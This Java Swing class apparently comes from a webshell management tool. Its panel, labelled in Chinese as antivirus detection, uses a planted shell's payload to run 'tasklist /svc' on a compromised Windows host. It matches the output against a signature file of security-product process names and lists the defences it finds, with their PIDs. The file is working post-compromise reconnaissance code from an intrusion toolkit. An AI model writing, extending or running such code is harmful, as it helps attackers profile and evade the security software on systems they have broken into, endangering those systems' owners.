package core.ui;

import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import core.annotation.DisplayName;
import core.imp.Payload;
import core.shell.ShellEntity;
import core.ui.component.DataView;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Iterator;
import java.util.Set;
import java.util.Vector;
import java.util.concurrent.CopyOnWriteArrayList;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.functions;

@DisplayName(DisplayName = "\u6740\u8f6f\u8bc6\u522b")
public class ShellAvscan extends JPanel {
    private static final Vector<String> COLUMNS_VECTOR = new Vector<>(new CopyOnWriteArrayList<>(Arrays.asList(
            "\u5e8f\u53f7", "\u8fdb\u7a0b\u540d", "PID", "\u6740\u8f6f\u8f6f\u4ef6")));
    private final DataView dataView;
    private final JButton getButton;
    private final JSplitPane portScanSplitPane;
    private final ShellEntity shellEntity;
    private final Payload payload;

    public ShellAvscan(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = shellEntity.getPayloadModule();
        this.getButton = new JButton("\u626b\u63cf");
        this.dataView = new DataView((Vector) null, COLUMNS_VECTOR, -1, -1);
        this.portScanSplitPane = new JSplitPane();
        this.portScanSplitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.portScanSplitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.getButton);
        this.portScanSplitPane.setTopComponent(topPanel);
        this.portScanSplitPane.setBottomComponent(new JScrollPane(this.dataView));
        this.setLayout(new BorderLayout());
        this.add(this.portScanSplitPane);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void getButtonClick(ActionEvent actionEvent) {
        try {
            if (!this.payload.isWindows()) {
                GOptionPane.showMessageDialog(this,
                        "\u76ee\u524d\u4ec5\u652f\u6301 Windows \u7cfb\u7edf\u7684\u6740\u8f6f\u8bc6\u522b\u3002",
                        "\u63d0\u793a",
                        2);
                return;
            }
            Vector<Vector<String>> rowsVector = this.getWinNet();
            this.dataView.AddRows(rowsVector);
        } catch (Exception var3) {
            Log.error(var3);
            GOptionPane.showMessageDialog(this,
                    var3.getMessage() != null ? var3.getMessage() : var3.toString(),
                    "\u9519\u8bef",
                    0);
        }
    }

    private Vector<Vector<String>> getWinNet() throws IOException {
        Vector<Vector<String>> rows = new Vector<>();
        String cmdResult = this.payload.execCommand("cmd.exe /c tasklist /svc").toLowerCase();
        InputStream inputStream = ShellAvscan.class.getResourceAsStream("/data/av.json");
        if (inputStream == null) {
            throw new IOException("missing classpath resource /data/av.json (\u8bf7\u786e\u8ba4 data/av.json \u6253\u5165 jar \u6216\u8fd0\u884c\u7c7b\u8def\u5f84)");
        }
        String extractBody;
        try (InputStream in = inputStream) {
            extractBody = new String(functions.readInputStream(in), StandardCharsets.UTF_8);
        }
        int i = 0;
        JSONObject jsonObject = JSONUtil.parseObj(extractBody);
        Set<String> keySet = jsonObject.keySet();
        Iterator<String> it = keySet.iterator();

        while (it.hasNext()) {
            String key = it.next();
            String lkey = key.toLowerCase();
            String value = jsonObject.getStr(key);
            if (!cmdResult.contains(lkey)) {
                continue;
            }
            int index = cmdResult.indexOf(lkey);
            if (index <= 0 || cmdResult.charAt(index - 1) != '\n') {
                continue;
            }
            ++i;
            String[] pidTmp = cmdResult.split(lkey, 2)[1].split(" ");
            String pid = "0";
            for (String s : pidTmp) {
                if (s.length() > 0) {
                    if (functions.isNumeric(s)) {
                        pid = s;
                        break;
                    }
                    pid = "0";
                }
            }
            Vector<String> oneRow = new Vector<>();
            oneRow.add(String.valueOf(i));
            oneRow.add(key);
            oneRow.add(pid);
            // av.json 为 UTF-8 特征库，值原样输出；isMessyCode 对纯中文+数字串误判，GBK 转换反而变乱码
            oneRow.add(value);
            rows.add(oneRow);
        }
        return rows;
    }

    public static String linuxHexToIP(String hexString) {
        ArrayList<String> arrayList = new ArrayList<>();
        byte[] bs = functions.hexToByte(hexString);
        for (byte b : bs) {
            arrayList.add(Integer.toString(b & 255));
        }
        Collections.reverse(arrayList);
        return Arrays.toString(arrayList.toArray()).replace(" ", "").replace("[", "").replace("]", "").replace(",", ".").trim();
    }
}
